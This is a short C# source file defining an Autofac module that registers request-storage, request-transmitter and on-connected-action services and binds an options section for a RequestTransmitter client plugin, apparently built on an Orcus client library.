using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Autofac;
using Microsoft.Extensions.Configuration;
using Orcus.Client.Library.Extensions;
using Orcus.Client.Library.Interfaces;
using RequestTransmitter.Client.Options;
using RequestTransmitter.Client.Storage;

namespace RequestTransmitter.Client.Hooks
{
    public class Autofac : Module
    {
        private readonly IConfiguration _configuration;

        public Autofac(IConfiguration configuration)
        {
            _configuration = configuration;
        }

        protected override void Load(ContainerBuilder builder)
        {
            base.Load(builder);

            builder.Configure<RequestTransmitterOptions>(_configuration.GetSection("RequestTransmitter"));
            builder.RegisterType<RequestStorage>().As<IRequestStorage>().SingleInstance();
            builder.RegisterType<RequestTransmitter>().As<IRequestTransmitter>().SingleInstance();
            builder.RegisterType<OnConnectedAction>().As<IConnectedAction>();
        }
    }
}
